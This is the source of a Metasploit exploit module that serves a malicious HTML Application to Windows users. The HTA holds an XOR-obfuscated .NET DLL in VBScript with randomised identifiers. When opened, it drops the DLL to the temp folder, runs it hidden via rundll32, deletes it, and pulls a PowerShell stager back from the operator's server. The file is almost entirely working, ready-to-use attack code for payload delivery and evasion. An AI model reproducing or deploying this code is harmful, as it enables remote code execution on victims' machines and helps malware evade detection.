##
# This module requires Metasploit: https://metasploit.com/download
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HTA sharp Web Server',
      'Description'    => %q(
        This module hosts an HTML Application (HTA) that when opened will run a
        Powershell payload via csharp assembly. When a user navigates to the HTA file they will
        be prompted by IE twice before the payload is executed.
      ),
      'License'        => MSF_LICENSE,
      'Author'         => '\@b4rtik',
      'Platform'       => %w(win),
      'Targets'        =>
        [
          [ 'x86', { 'Platform' => 'win', 'Arch' => ARCH_X86 } ],
          [ 'x64', { 'Platform' => 'win', 'Arch' => ARCH_X64 } ]
        ],
      'DefaultTarget'  => 1
    ))
  end

  def primer
    hardcoded_uripath('/stager.ps1')
  end

  def send_first_stage(cli, _request)

        print_status('Hta requested')

        proto = "http"
        if datastore['SSL'] == true
           proto = "https"
        end

        key = Random.new.bytes(1).unpack("H*")[0]

        path ||= File.join(Msf::Config.data_directory, "hta_sharp")
        #generate assembly hex
        if datastore['TARGET'] == 0
           hexassembly = encode_assembly(key,File.read("#{path}/HiddenPowerShellDllx86.dll").unpack('H*')[0])
        else
           hexassembly = encode_assembly(key,File.read("#{path}/HiddenPowerShellDllx64.dll").unpack('H*')[0])
        end
        #generate param string hex
        hexcommand_param = "#{proto}*#{datastore['SRVHOST']}*#{datastore['SRVPORT']}".each_byte.map { |b| b.to_s(16) }.join

        # generate .hta content
        charset = Array('a'..'z')
        length = 10
        assembly = Array.new(length) { charset.sample }.join
        runcode = Array.new(length) { charset.sample }.join
        app = Array.new(length) { charset.sample }.join
        hfso = Array.new(length) { charset.sample }.join
        hfile = Array.new(length) { charset.sample }.join
        intlen = Array.new(length) { charset.sample }.join
        intpos = Array.new(length) { charset.sample }.join
        elm = Array.new(length) { charset.sample }.join
        char = Array.new(length) { charset.sample }.join
        shell = Array.new(length) { charset.sample }.join
        obj = Array.new(length) { charset.sample }.join

        data = %Q|
<script language="VBScript">
    #{assembly} = "#{hexassembly}"

    Function #{runcode}()
        #{app} = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\\#{hexcommand_param}.dll"
        Set #{hfso} = CreateObject("Scripting.FileSystemObject")
        Set #{hfile} = #{hfso}.CreateTextFile(#{app}, true)
        #{intlen} = len(#{assembly})
        #{intpos} = 1
        while #{intpos} < #{intlen}
          #{elm} = Hex(CByte("&H" & Mid(#{assembly}, #{intpos}, 2)) XOR CByte("&H#{key}"))
          if(len(#{elm}) = 1 ) then
             #{elm} = "0" & #{elm}
          end if
          #{char} = Int("&H" & #{elm})
          #{hfile}.Write(Chr(#{char}))
          #{intpos} = #{intpos}+2
        wend
        #{hfile}.Close
        Set #{shell}=CreateObject("WScript.Shell")
        cmd = "rundll32 " & #{app} & ",Ruk"
        #{shell}.run cmd,0,true
        Set #{obj} = CreateObject("Scripting.FileSystemObject")
        #{obj}.DeleteFile(#{app})
    end function

    #{runcode}()
    self.close
</script>
        |

        send_response(cli, data, 'Content-Type' => 'application/hta')

  end

def send_stager_stage(cli,_request)

    print_status('Delivering Powershell stager payload')

    p = regenerate_payload(cli)
    if datastore['payload'] =~ /empire_http$/
        data = (Msf::Simple::Buffer.transform(
          p.encoded,
          'raw',
          'powershell'
        )).split('[psh]')[1]
    else
        data = Msf::Util::EXE.to_executable_fmt(
          framework,
          target.arch,
          target.platform,
          p.encoded,
          'psh',
          { :arch => target.arch, :platform => target.platform }
        )
    end
    send_response(cli, data, 'Content-Type' => 'text/plain')
  end

  def encode_assembly(key,hexstring)
        i = 0
        result = ""
        while i < hexstring.length do
           result = ("#{result}#{hexstring[i]}#{hexstring[i+1]}".to_i(16) ^ key.to_i(16)).to_s(16)
           i = i+2
        end
        return result
  end

  def on_request_uri(cli, _request)
    if _request.raw_uri =~ /\.hta$/
        send_first_stage(cli,_request)
    else
        send_stager_stage(cli,_request)
    end

  end

  def random_uri
    # uri needs to end in .hta for IE to process the file correctly
    '/' + Rex::Text.rand_text_alphanumeric(rand(10) + 6) + '.hta'
  end
end

